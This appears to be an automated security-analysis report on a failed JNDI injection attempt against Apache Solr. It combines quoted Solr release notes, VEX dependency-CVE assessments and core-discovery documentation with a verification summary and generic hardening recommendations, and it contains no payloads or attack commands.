+- ONLINE [Official vendor webpage] Solr News - Apache Solr: UNTRUSTED WEB RESEARCH (not PCAP evidence). Solr's "allowPath" setting is being used to restrict file access to certain directories. Solr's "create core" API is exposed and accessible to ... | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] You may also read these news as ATOM feeds: Announcements, Security Announcements.. 4 October 2026, Apache Solr™ 9.11.0 available The Solr PMC is pleased to announce the release of Apache Solr 9.11.0. Solr is the blazing-fast, open source, multi-modal search platform built on Apache Lucene. It powers full-text, vector, analytics, and geospatial search at many of the world's largest organizations. Other major features include Kubernetes and docker integration, streaming, highlighting, faceting, and spellchecking. Solr 9.11.0 is available for immediate download at: https://solr.apache.org/downloads.html Solr 9.11.0 Release Highlights:¶ Added new range field types — IntRangeField, LongRangeField, FloatRangeField, and DoubleRangeField — for storing and querying numeric ranges, plus an experimental numericRange query parser. Extended nested/block document support: the parent and child query parsers gained a parentPath local parameter (childPath also added) that automatically derives the correct filter from document nesting, so queries no longer need to reference the internal nest path field directly. Also added a root-document query shortcut for nested document queries. Index sorting now works correctly with nested documents. Added hybrid search based on reciprocal rank fusion (RRF) via a new combined query search handler, merging multiple query strategies into one ranked result set. Also supports result collapsing and query elevation. Added support for multiple dense vectors per document (nested vectors), enabling multi-valued vector search. Added MergeOnFlushMergePolicy, merging small segments together at commit, reducing segments to search. Added ContentHashVersionProcessor, an update processor avoiding index churn when re-adding documents with identical content. Expanded streaming expression rollup with new metrics: missing-value counts, count-distinct, percentile, standard deviation. Added support for stored fields in Export Writer output, not just docValues. Added an UPGRADECOREINDEX core admin action to upgrade an index format in place without reindexing. The Luke handler now aggregates results across all shards by default. Improved multiThreaded=true query performance when a docset is needed, such as faceting. JWT authentication's blockUnknown setting now defaults to true, blocking unauthenticated requests by default; it previously defaulted to false despite documentation stating otherwise. Deployments relying on pass-through authentication must now explicitly set blockUnknown to false. Added an allowZkHosts setting to restrict which ZooKeeper connection strings a cross-collection join or streaming expression may target. The local SolrCloud ensemble is always allowed. Removed LocalTikaExtractionBackend from the extraction module (SolrCell); extracting content via a remote Tika Server is now the only option. And more features/improvements. Please refer to the Upgrade Notes in the Solr Ref Guide for information on upgrading from previous Solr versions: https://solr.apache.org/guide/solr/9_11/upgrade-notes/solr-upgrade-notes.html Please read CHANGELOG.md for a full list of new features, changes and bugfixes: https://solr.apache Source: https://solr.apache.org/news.html
+- ONLINE RESEARCH LEAD [Official vendor webpage] Apache Solr VEX: UNTRUSTED WEB RESEARCH (not PCAP evidence). CVE-2026-34478, Apache Log4j Core: Log injection via CRLF sequences in Rfc5424Layout. Published: 2026-04-10. Status: not_affected. Affected Solr versions: 9.10. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] ← Back to the dependency CVE table CVE-2026-64607 (medium severity) is a connection-leak bug in Apache HttpComponents Client's classic (blocking) I/O model: if a response has an invalid or unsupported Content-Encoding header, the client fails to release the underlying connection back to the connection manager, eventually exhausting the pool and causing a denial of service. It does not affect HttpClient's async I/O model. It affects httpclient5 from 5.0-alpha1 through 5.6.2; fixed in 5.6.3. Solr is not affected. httpclient5 (along with httpcore5 and httpcore5-h2, covered in separate VEX entries for their own CVEs) is bundled transitively by org.apache.calcite.avatica:avatica-core, which uses it to support Avatica's optional remote-JDBC transport -- connecting to a remote Avatica server over HTTP. Solr's own /sql handler (CalciteSolrDriver) only ever opens a local, in-process org.apache.calcite.jdbc.CalciteConnection; there is no org.apache.hc.client5/org.apache.hc.core5 usage anywhere in solr/modules/sql's source, and Solr never acts as an Avatica HTTP client or server. The dependency has in fact been marked permitUnusedDeclared in Solr's own build since at least the 10.0.0 release, confirming the build's own dependency-analysis tooling already recognized it as present-but-unused. It's also shipped only via the optional solr:modules:sql module -- every other place it appears (solrj-streaming, solr-ref-guide, webapp) is test-scope only, not shipped. Solr has shipped an affected httpclient5 since at least 9.1.0 (through 10.0.0, and continuing on branch_10x/main at 5.5). branch_9x has since moved to 5.6.4, past the fix -- picked up incidentally via routine dependency maintenance, not a targeted fix for this CVE. Since the code path is unreachable regardless, no fix is required on branch_10x/main either. CVE: CVE-2026-64607 CVE-2026-54428 is an allocation-without-limits issue in Apache HttpComponents Core's HTTP/2 HPACK decoder: before an HTTP/2 peer's SETTINGS frame is acknowledged, the configured header list size limit isn't yet applied, so a remote peer can send oversized compressed header blocks and exhaust memory, causing a denial of service. It affects httpcore5-h2 5.4.2 and earlier (and 5.5-beta1 and earlier); fixed in 5.4.3. Solr is not affected. httpcore5-h2 is bundled transitively by org.apache.calcite.avatica:avatica-core, which uses it to support Avatica's optional remote-JDBC HTTP/2 transport -- see the companion VEX entry for CVE-2026-64607 (httpclient5) for the full reachability analysis, which applies identically here: Solr's /sql handler never uses Avatica's remote HTTP transport, only the local embedded CalciteConnection, so the HPACK decoder this CVE concerns -- which only runs when HttpComponents is actually acting as an HTTP/2 endpoint -- is never invoked. The dependency is permitUnusedDeclared in Solr's own build and shipped only via the optional solr:modules:sql module. Solr has shipped an affected httpcore5-h2 since at least 9.1.0 (through 10.0.0, and continuing on branch_10x/main at 5.3.4). branch_9x has since moved to 5.4.3, exactly the fix version -- picked up incidentally via routine depende Source: https://solr.apache.org/vex.html
+- ONLINE [Serper web result] Apache Solr Injection Research: UNTRUSTED WEB RESEARCH (not PCAP evidence). This research is aimed to present a new vulnerability: "Solr parameter Injection" and describe how it may be exploited in different scenarios. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Source: https://github.com/veracode-research/solr-injection
+- ONLINE [Official vendor webpage] Core Discovery :: Apache Solr Reference Guide: UNTRUSTED WEB RESEARCH (not PCAP evidence). You can create new Solr cores on the fly, shutdown cores, even replace one running core with another, all without ever stopping or restarting Solr. Your core. | Webpage text: Archived Solr Reference Guides Core discovery means that creating a core is as simple as a core.properties file located on disk. In Solr, the term core is used to refer to a single index and associated transaction log and configuration files (including the solrconfig.xml and schema files, among others). Your Solr installation can have multiple cores if needed, which allows you to index data with different structures in the same server, and maintain control over how your data is presented to different audiences. In SolrCloud mode you will be more familiar with the term collection. Behind the scenes a collection consists of one or more cores. Cores can be created using bin/solr script or as part of SolrCloud collection creation using the APIs. Core-specific properties (such as the directories to use for the indexes or configuration files, the core name, and other options) are defined in a core.properties file. Any core.properties file in any directory of your Solr installation (or in a directory under where solr_home is defined) will be found by Solr and the defined properties will be used for the core named in the file. The core.properties file is a simple Java Properties file where each line is just a key=value pair, e.g., name=core1. Notice that no quotes are required. A minimal core.properties file looks like the example below. However, it can also be empty, see information on placement of core.properties below. Placement of core.properties Solr cores are configured by placing a file named core.properties in a sub-directory under solr.home. There are no a-priori limits to the depth of the tree, nor are there limits to the number of cores that can be defined. Cores may be anywhere in the tree with the exception that cores may not be defined under an existing core. That is, the following is not allowed: ./cores/core1/core.properties ./cores/core1/coremore/core5/core.properties In this example, the enumeration will stop at "core1". ./cores/somecores/core1/core.properties ./cores/somecores/core2/core.properties ./cores/othercores/core3/core.properties ./cores/extracores/deepertree/core4/core.properties It is possible to segment Solr into multiple cores, each with its own configuration and indices. Cores may be dedicated to a single application or to very different ones, but all are administered through a common administration interface. You can create new Solr cores on the fly, shutdown cores, even replace one running core with another, all without ever stopping or restarting Solr. Your core.properties file can be empty if necessary. Suppose core.properties is located in ./cores/core1 (relative to solr_home) but is empty. In this case, the core name is assumed to be "core1". The instanceDir will be the folder containing core.properties (i.e., ./cores/core1). The dataDir will be ../cores/core1/data, etc. You can run Solr without configuring any cores. Defining core.properties Files The minimal core.properties file is an empty file, in which case all of the properties are defaulted appropriately. Java properties files allow the hash (#) or bang (!) characters to specify comment-to-end-of-line. The following properties are available: The name of the SolrCore. You’ll use t Source: https://solr.apache.org/guide/solr/latest/configuration-guide/core-discovery.html
+
+Verification Summary:
+- Affected service: Apache Solr.
+- Attack type: JNDI Injection.
+- Attack technique: JNDI Lookup Expression.
+- Service supported by Verifier: Yes.
+- Attack supported by Verifier: Yes.
+- Attack success supported by Verifier: Yes.
+- Verification result: Supported.
+- Verifier confidence: Medium.
+- Consensus confidence: High.
+- Consensus score: 4/4.
+- Consensus attack outcome: Fail.
+- Exact CVE attribution was not confirmed from the available packet and version evidence.
+- CVE assessment: Analyst proposed Not Found; independent Verifier CVE support: Not Applicable. No separate online CVE validator was run.
+- Binary associated-CVE mechanism match: No.
+- Exact CVE applicability established: No.
+- Binary attack prediction: Fail (High confidence).
+- Attack prediction supported by prior Consensus: Yes.
+- Binary decision limitation: CVE mechanism match is not established; No means not supported, not disproven.
+- Binary decision limitation: Exact affected-version/configuration applicability has not been established; No does not mean patched or safe.
+- MCP evidence search status: Valid.
+- MCP investigation query: Apache Solr JNDI Injection endpoint solr cores packet clues: endpoint solr cores.
+- Online results were used as supporting context and did not replace packet evidence or Verifier findings.
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2026-22444
+- Evidence-source URL: https://solr.apache.org/news.html
+- Evidence-source URL: https://solr.apache.org/vex.html
+- Evidence-source URL: https://github.com/veracode-research/solr-injection
+- Evidence-source URL: https://solr.apache.org/guide/solr/latest/configuration-guide/core-discovery.html
+- Evidence limitation: Online sources are supporting context; packet evidence remains primary.
+- Evidence limitation: The Analyzer and Verifier findings were retained without rewriting.
+- Evidence limitation: 2 online CVE record(s) were retained as product-related research leads only; they were not used as the validated CVE.
+
+Defensive Recommendation:
+- Ensure Apache Solr is updated to the latest version to mitigate known vulnerabilities.
+- Implement strict input validation to prevent injection attacks.
+- Enable Solr's RuleBasedAuthorizationPlugin to restrict unauthorized access.
+- Regularly review and update security configurations and permissions.
